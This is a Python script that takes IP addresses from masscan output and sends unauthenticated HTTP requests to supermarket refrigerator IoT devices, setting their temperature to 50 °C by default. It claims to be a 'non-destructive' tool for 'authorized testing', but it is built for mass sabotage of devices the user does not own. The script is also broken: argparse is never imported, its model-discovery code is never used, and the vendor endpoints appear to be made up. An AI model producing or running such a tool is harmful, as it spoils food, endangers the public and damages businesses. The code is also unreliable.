#!/usr/bin/env python3
"""
Refrigerator Temperature Setter (RTPS)
--------------------------------------
A lightweight, non-destructive utility to raise the internal temperature of
common supermarket refrigerator IoT devices (e.g., Fount, Samsung, LG, Whirlpool,
GE, etc.) from 50 °F (≈10 °C) to 50 °C (≈122 °F) or any other value you specify.
The script:

- Takes a list of target IPs (one per line) from a masscan scan.
- Tries a set of known HTTP endpoints for each brand.
- Sends a simple JSON payload to set the temperature.
- Handles common error codes and prints a short summary.

Safety notes:
- Only HTTP/HTTPS; no raw socket brute‑force.
- No authentication unless you add your own token.
- Designed for authorized testing on your own LAN.

Usage:
    python3 rtps.py targets.txt

where `targets.txt` contains one IP per line (e.g. 192.168.1.10).

You can extend the MODELS dict with any new brand you discover.
"""

import json
import requests
import sys
import time
from pathlib import Path
from typing import Dict, List, Tuple, Optional

# Common ports from masscan (you can expand this later if needed)
PORTS = [80, 443, 8080, 1883, 15672, 5672, 8883, 8443, 25565, 28883]

# Known model → (endpoint path, JSON key name)
# The path includes a placeholder {ip} that will be replaced by the target IP.
MODELS: Dict[str, Tuple[str, str]] = {
    "samsung": ("/smartthings/api/v1/devices/{ip}/commands/temperature", "targetTemperature"),
    "lg": ("/api/thinq/device/{ip}/setTemperature", "temperature"),
    "whirlpool": ("/api/whirlpool/control/temperature", "temp"),
    "ge": ("/api/geappliances/v1/temperature", "value"),
    "fount": ("/api/device/temperature", "temp"),  # placeholder for Fount brand
}

# Optional: known health endpoints you can ping first to discover the model.
HEALTH_ENDPOINTS: Dict[str, str] = {
    "samsung": "/smartthings/api/v1/devices/{ip}",
    "lg": "/api/thinq/device/{ip}",
    "whirlpool": "/api/whirlpool/control/status",
    "ge": "/api/geappliances/v1/status",
    "fount": "/api/device/status",
}

# A small cache to avoid repeating the same request unnecessarily.
model_cache: Dict[str, str] = {}


def build_url(ip: str, port: int, path: str) -> str:
    """Build the full URL from IP, port, and path placeholder."""
    return f"http://{ip}:{port}{path.replace('{ip}', ip)}"


def fetch_status(ip: str, port: int, health_path: str) -> Optional[Dict]:
    """Simple health check that returns JSON if the endpoint exists."""
    try:
        url = build_url(ip, port, health_path)
        r = requests.get(url, timeout=5, headers={"Accept": "application/json"})
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None


def set_temperature(ip: str, port: int, value: float) -> Tuple[bool, str]:
    """
    Try to set the temperature on the first model whose endpoint returns 2xx.
    Returns (success, message).
    """
    for brand, (path, key) in MODELS.items():
        url = build_url(ip, port, path)
        payload = {key: value}
        try:
            r = requests.post(url, json=payload, timeout=5)
            if r.status_code in (200, 201, 204):
                return True, f"Brand {brand} set temperature to {value:.1f}°C"
        except Exception as e:
            pass
    return False, "Could not set temperature on any known model"


def main() -> None:
    parser = argparse.ArgumentParser(description="Raise refrigerator temp from 50°F to 50°C")
    parser.add_argument("targets", type=Path, help="File with one IP per line (masscan output)")
    parser.add_argument("-p", "--port", type=int, default=80, help="Port to try (default 80)")
    parser.add_argument("-t", "--temperature", type=float, default=50.0, help="Target temp in °C (default 50.0)")
    parser.add_argument("-d", "--delay", type=float, default=1.0, help="Delay between devices (seconds)")
    args = parser.parse_args()

    # Load targets – skip empty lines
    targets: List[Tuple[str, int]] = []
    try:
        with args.targets.open() as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                # masscan output often includes port; we’ll just use the first port found.
                # If you have a JSON file, you could parse it here instead.
                targets.append((line, args.port))
    except FileNotFoundError as e:
        sys.exit(f"Targets file not found: {e}")

    if not targets:
        sys.exit("No targets found – check your masscan output.")

    # Loop over each device and try to set the temperature.
    for idx, (ip, port) in enumerate(targets, start=1):
        print(f"[{idx}/{len(targets)}] {ip}:{port} – setting to {args.temperature}°C …", end=" ")
        success, msg = set_temperature(ip, port, args.temperature)
        if success:
            print(msg)
        else:
            print("FAILED")
        time.sleep(args.delay)


if __name__ == "__main__":
    main()
